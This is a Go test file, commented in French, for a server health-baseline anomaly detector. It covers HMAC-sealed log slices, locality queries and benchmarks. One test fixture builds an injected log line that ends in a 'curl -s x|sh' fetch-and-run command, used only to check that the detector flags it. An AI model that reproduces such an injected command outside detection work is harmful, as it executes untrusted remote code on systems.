package engine

import (
	"bytes"
	"errors"
	"math/rand/v2"
	"testing"
)

var v4Key = []byte("cle-hote-partagee-32-octets-abcd")

func v4Entries(n int) []OracleVectorEntry {
	entries := make([]OracleVectorEntry, n)
	for i := range entries {
		entries[i].Bitcode[0] = uint64(i) * 0x9E3779B97F4A7C15
		entries[i].RelativeSec = uint32(i * 60)
		entries[i].HealthScore = 950
	}
	return entries
}

// Une tranche v4 scellée sous clé se relit sous cette clé seulement ; sans clé,
// ou sous une autre clé, le sceau est refusé ; une tranche scellée en SHA-256
// simple est refusée sous clé.
func TestOracleV4_HMACSeal(t *testing.T) {
	entries := v4Entries(4)
	hdr := OracleDailyHeader{EpochDay: 20716, MachineID: 7, PrevDaySeal: [32]byte{1, 2, 3}, ObservedCount: 9}
	var keyed bytes.Buffer
	if err := SaveOracleDayHMAC(&keyed, &hdr, entries, v4Key); err != nil {
		t.Fatal(err)
	}
	if hdr.Flags&OracleFlagKeyed == 0 {
		t.Fatal("OracleFlagKeyed absent")
	}
	got, e, err := LoadOracleDayHMAC(bytes.NewReader(keyed.Bytes()), v4Key)
	if err != nil || len(e) != 4 || got.PrevDaySeal != hdr.PrevDaySeal || got.ObservedCount != 9 || got.Version != 4 {
		t.Fatalf("relecture sous cle: %v %+v", err, got)
	}
	if _, _, err := LoadOracleDay(bytes.NewReader(keyed.Bytes())); !errors.Is(err, ErrOracleSeal) {
		t.Fatalf("sans cle: %v", err)
	}
	if _, _, err := LoadOracleDayHMAC(bytes.NewReader(keyed.Bytes()), []byte("autre-cle-hote-de-32-octets-wxyz")); !errors.Is(err, ErrOracleSeal) {
		t.Fatalf("autre cle: %v", err)
	}
	var plain bytes.Buffer
	h2 := OracleDailyHeader{EpochDay: 20716, MachineID: 7}
	if err := SaveOracleDay(&plain, &h2, entries); err != nil {
		t.Fatal(err)
	}
	if _, _, err := LoadOracleDayHMAC(bytes.NewReader(plain.Bytes()), v4Key); !errors.Is(err, ErrOracleSeal) {
		t.Fatalf("SHA-256 sous cle: %v", err)
	}
	if err := SaveOracleDayHMAC(&plain, &h2, entries, []byte("court")); !errors.Is(err, ErrSealKey) {
		t.Fatalf("cle courte: %v", err)
	}
	// ObservedCount ne descend jamais sous VectorCount.
	if h2.ObservedCount != 4 {
		t.Fatalf("ObservedCount=%d, attendu 4", h2.ObservedCount)
	}
}

// Sous clé, une tranche v2 ou v3 n'est pas authentifiable : refus
// ErrOracleUnkeyed, en-tête rendu pour l'archivage. Sans cette garde, qui
// ignore la clé forgerait une tranche en la déclarant de version 3.
func TestOracleV4_LegacyRefusedUnderKey(t *testing.T) {
	for _, v := range []uint16{OracleVersionLegacy, OracleVersionV3} {
		data := oracleDayWithVersion(v, v4Entries(2))
		hdr, e, err := LoadOracleDayHMAC(bytes.NewReader(data), v4Key)
		if !errors.Is(err, ErrOracleUnkeyed) || hdr == nil || hdr.Version != v || e != nil {
			t.Fatalf("v%d sous cle: %v %+v", v, err, hdr)
		}
		if _, _, err := LoadOracleDay(bytes.NewReader(data)); err != nil {
			t.Fatalf("v%d sans cle: %v", v, err)
		}
	}
}

// Le sceau couvre PrevDaySeal et ObservedCount : altérer le chaînage ou le
// compte observé d'une tranche scellée est détecté.
func TestOracleV4_SealCoversChainFields(t *testing.T) {
	hdr := OracleDailyHeader{EpochDay: 20716, MachineID: 7, PrevDaySeal: [32]byte{9}}
	var buf bytes.Buffer
	if err := SaveOracleDayHMAC(&buf, &hdr, v4Entries(2), v4Key); err != nil {
		t.Fatal(err)
	}
	for name, off := range map[string]int{"PrevDaySeal": 48, "ObservedCount": 112, "Reserved": 120} {
		data := bytes.Clone(buf.Bytes())
		data[off] ^= 1
		if _, _, err := LoadOracleDayHMAC(bytes.NewReader(data), v4Key); !errors.Is(err, ErrOracleSeal) {
			t.Fatalf("%s altere: %v", name, err)
		}
	}
	// Une tranche tronquée dans l'extension de 48 octets de l'en-tête v4 est refusée sans panique.
	if _, _, err := LoadOracleDay(bytes.NewReader(buf.Bytes()[:100])); !errors.Is(err, ErrOracleCorrupt) {
		t.Fatalf("en-tete v4 tronque: %v", err)
	}
}

// queryStateLocalityScan est l'ancien balayage complet de QueryStateLocality,
// gardé comme oracle d'équivalence et de performance.
func queryStateLocalityScan(o *ServerBaselineOracle, bitcode *[8]uint64, cfg LocalityThresholds) (bool, LocalityDistance) {
	best := localityDistanceNone
	bestSum := int(^uint(0) >> 1)
	nominal, found := false, false
	for i := range o.entries {
		d := LocalityDistanceOf(bitcode, &o.entries[i].Bitcode)
		if d.Within(cfg) {
			if sum := d.Scalar + d.Entity + d.Content; !nominal || sum < bestSum {
				nominal, bestSum, best = true, sum, d
			}
			continue
		}
		if !nominal && (!found || localityRankLess(d, best)) {
			found, best = true, d
		}
	}
	return nominal, best
}

// randomLocalitySnap tire un instantané dans un petit univers de catégories,
// d'entités et de charges, pour que les voisinages existent.
func randomLocalitySnap(r *rand.Rand) ServerHealthSnapshot {
	s := ServerHealthSnapshot{
		TimestampSec:    1789800000 + uint64(r.IntN(86400)),
		Subsystem:       uint16(1 + r.IntN(3)),
		Action:          uint16(1 + r.IntN(3)),
		HealthScore:     uint16(800 + r.IntN(200)),
		Severity:        uint16(r.IntN(3)),
		CorrelatedCount: uint16(1 + r.IntN(4)),
		EntropyQ8:       uint32(r.IntN(1500)),
		EntityID:        uint64(1 + r.IntN(5)),
	}
	copy(s.RawPayload[:], []string{"session opened for user", "accepted publickey", "status installed libc"}[r.IntN(3)])
	return s
}

// Le verdict nominal par compartiments est celui du balayage complet, sous
// tolérance d'entité nulle comme sous tolérance positive ; l'écart rendu est
// identique dès qu'une voisine existe, ou dès que le compartiment balayé
// contient la référence la mieux classée.
func TestQueryStateLocality_BucketsMatchFullScan(t *testing.T) {
	r := rand.New(rand.NewPCG(1, 2))
	o := NewServerBaselineOracle(1, 0)
	entries := make([]OracleVectorEntry, 3000)
	for i := range entries {
		s := randomLocalitySnap(r)
		entries[i] = localityEntry(&s)
	}
	o.IngestDailyEntries(entries)
	for _, cfg := range []LocalityThresholds{
		{MaxScalar: 24, MaxContent: 24},
		{MaxSeverityRise: 1, MaxScalar: 16, MaxEntity: 16, MaxContent: 30},
	} {
		nominals := 0
		for range 2000 {
			q := randomLocalitySnap(r)
			code := localityCode(&q)
			wantNom, wantDist := queryStateLocalityScan(o, code, cfg)
			gotNom, gotDist, _, _ := o.QueryStateLocality(code, cfg)
			if gotNom != wantNom {
				t.Fatalf("cfg %+v: nominal %v, balayage %v", cfg, gotNom, wantNom)
			}
			if gotNom && gotDist.Scalar+gotDist.Entity+gotDist.Content != wantDist.Scalar+wantDist.Entity+wantDist.Content {
				t.Fatalf("cfg %+v: ecart %+v, balayage %+v", cfg, gotDist, wantDist)
			}
			if gotNom {
				nominals++
			}
		}
		if nominals == 0 || nominals == 2000 {
			t.Fatalf("cfg %+v: %d nominaux sur 2000, le test ne discrimine pas", cfg, nominals)
		}
	}
}

// Un état de catégorie inédite rend localityDistanceNone sans balayage ; un
// état de catégorie connue mais d'entité inédite (tolérance nulle) aussi.
func TestQueryStateLocality_EmptyBucketIsImmediate(t *testing.T) {
	o := NewServerBaselineOracle(1, 0)
	base := localityBase()
	o.IngestDailyEntries([]OracleVectorEntry{localityEntry(&base)})
	cfg := DefaultLocalityThresholds()
	other := base
	other.Action = OracleActProcessSpawn
	alien := base
	alien.EntityID = 424242
	for name, q := range map[string]ServerHealthSnapshot{"categorie": other, "entite": alien} {
		if nominal, d, sub, score := o.QueryStateLocality(localityCode(&q), cfg); nominal || d != localityDistanceNone || sub != 0 || score != 0 {
			t.Fatalf("%s inedite: %v %+v %d %d", name, nominal, d, sub, score)
		}
	}
}

// localityBaselineNovel construit une baseline de n références réparties sur
// 49 catégories et 20 entités, et rend un état de catégorie inédite.
func localityBaselineNovel(n int) (*ServerBaselineOracle, *[8]uint64) {
	o := NewServerBaselineOracle(1, 0)
	entries := make([]OracleVectorEntry, n)
	for i := range entries {
		s := localityBase()
		s.Subsystem = uint16(1 + i%7)
		s.Action = uint16(1 + (i/7)%7)
		s.EntityID = uint64(1 + i%20)
		s.TimestampSec += uint64(i % 86400)
		entries[i] = localityEntry(&s)
	}
	o.IngestDailyEntries(entries)
	q := localityBase()
	q.Subsystem, q.Action = 9, 9
	return o, localityCode(&q)
}

// Rapport de latence mesuré : balayage complet contre compartiments, sur un
// état inédit face à 524 288 références (une tranche pleine).
func TestQueryStateLocality_NovelStateSpeedup(t *testing.T) {
	if testing.Short() {
		t.Skip("mesure de latence")
	}
	o, code := localityBaselineNovel(OracleMaxVectorCount)
	cfg := DefaultLocalityThresholds()
	scan := testing.Benchmark(func(b *testing.B) {
		for b.Loop() {
			queryStateLocalityScan(o, code, cfg)
		}
	})
	bucket := testing.Benchmark(func(b *testing.B) {
		for b.Loop() {
			o.QueryStateLocality(code, cfg)
		}
	})
	ratio := float64(scan.NsPerOp()) / float64(max(bucket.NsPerOp(), 1))
	t.Logf("etat inedit, %d references : balayage %d ns/op, compartiments %d ns/op, rapport %.0f",
		OracleMaxVectorCount, scan.NsPerOp(), bucket.NsPerOp(), ratio)
	if ratio < 100 {
		t.Fatalf("rapport %.0f, attendu au moins 100", ratio)
	}
	if bucket.AllocsPerOp() != 0 {
		t.Fatalf("compartiments: %d allocations", bucket.AllocsPerOp())
	}
}

func BenchmarkQueryStateLocality_NovelState(b *testing.B) {
	o, code := localityBaselineNovel(OracleMaxVectorCount)
	cfg := DefaultLocalityThresholds()
	b.ReportAllocs()
	for b.Loop() {
		o.QueryStateLocality(code, cfg)
	}
}

func BenchmarkQueryStateLocality_NovelStateFullScan(b *testing.B) {
	o, code := localityBaselineNovel(OracleMaxVectorCount)
	cfg := DefaultLocalityThresholds()
	b.ReportAllocs()
	for b.Loop() {
		queryStateLocalityScan(o, code, cfg)
	}
}

// Le créneau se décode du mot 5 pour les 64 positions.
func TestLocalitySlotOf_AllSlots(t *testing.T) {
	for slot := range localitySlotsPerDay {
		s := localityBase()
		s.TimestampSec = s.TimestampSec/86400*86400 + uint64(slot)*86400/localitySlotsPerDay
		code := localityCode(&s)
		if got := LocalitySlotOf(code[5]); got != slot {
			t.Fatalf("creneau %d decode en %d", slot, got)
		}
	}
}

// payloadSnap rend l'instantané de base avec la charge p à l'heure h.
func payloadSnap(p string, hour int) ServerHealthSnapshot {
	s := localityBase()
	s.TimestampSec = s.TimestampSec/86400*86400 + uint64(hour)*3600
	s.RawPayload = [FeaturePayloadBytes]byte{}
	copy(s.RawPayload[:], p)
	return s
}

// Paradoxe de l'union des boules de Hamming : une baseline de gabarits variés
// finit par contenir, pour une ligne injectée, une référence dont le SimHash
// est à moins de 24 bits, si bien que le test booléen la déclare nominale. La
// surprise -log2 P(gabarit | créneau) la juge inédite et la refuse, tandis
// qu'un gabarit fréquent du créneau reste nominal.
func TestQueryStateLocality_SurpriseDefeatsHammingUnion(t *testing.T) {
	o := NewServerBaselineOracle(1, 0)
	var entries []OracleVectorEntry
	var refs []ServerHealthSnapshot
	for i := range 400 {
		s := payloadSnap("session opened for user u"+string(rune('a'+i%26))+string(rune('a'+i/26))+" by (uid=#)", 10)
		refs = append(refs, s)
		entries = append(entries, localityEntry(&s))
	}
	common := payloadSnap("session opened for user root by (uid=#)", 10)
	for range 200 {
		entries = append(entries, localityEntry(&common))
	}
	o.IngestDailyEntries(entries)

	injected := payloadSnap("session opened for user root by (uid=#);curl -s x|sh", 10)
	code := localityCode(&injected)
	hamming := DefaultLocalityThresholds()
	hamming.MaxContentSurpriseBits = 0
	if nominal, _, _, _ := o.QueryStateLocality(code, hamming); !nominal {
		t.Fatal("prerequis: le test de Hamming seul devrait admettre la ligne injectee")
	}
	cfg := DefaultLocalityThresholds()
	if nominal, _, _, _ := o.QueryStateLocality(code, cfg); nominal {
		t.Fatalf("ligne injectee nominale malgre une surprise de %.1f bits", o.ContentSurprise(code))
	}
	if s := o.ContentSurprise(code); s <= DefaultMaxContentSurpriseBits {
		t.Fatalf("surprise de la ligne injectee %.1f bits", s)
	}
	commonCode := localityCode(&common)
	if nominal, _, _, _ := o.QueryStateLocality(commonCode, cfg); !nominal {
		t.Fatalf("gabarit frequent refuse (surprise %.1f bits)", o.ContentSurprise(commonCode))
	}
	// Le même gabarit fréquent, observé seulement à 10 h, est plus surprenant à 22 h.
	night := payloadSnap("session opened for user root by (uid=#)", 22)
	if o.ContentSurprise(localityCode(&night)) <= o.ContentSurprise(commonCode) {
		t.Fatal("la surprise ne depend pas du creneau")
	}
	if n := testing.AllocsPerRun(200, func() { o.QueryStateLocality(code, cfg) }); n != 0 {
		t.Fatalf("QueryStateLocality avec surprise: %v allocations", n)
	}
}

// Une tranche échantillonnée pondère le modèle : un gabarit vu une fois dans
// une tranche de poids 100 est moins surprenant que vu une fois au poids 1.
func TestTemplateRarity_Weight(t *testing.T) {
	a, b := NewTemplateRarity(), NewTemplateRarity()
	s := payloadSnap("cron job started", 3)
	filler := payloadSnap("other line entirely", 3)
	for _, m := range []*TemplateRarity{a, b} {
		for range 1000 {
			m.Observe(localityCode(&filler), 1)
		}
	}
	a.Observe(localityCode(&s), 1)
	b.Observe(localityCode(&s), 100)
	if b.Surprise(localityCode(&s)) >= a.Surprise(localityCode(&s)) {
		t.Fatal("le poids ne reduit pas la surprise")
	}
}
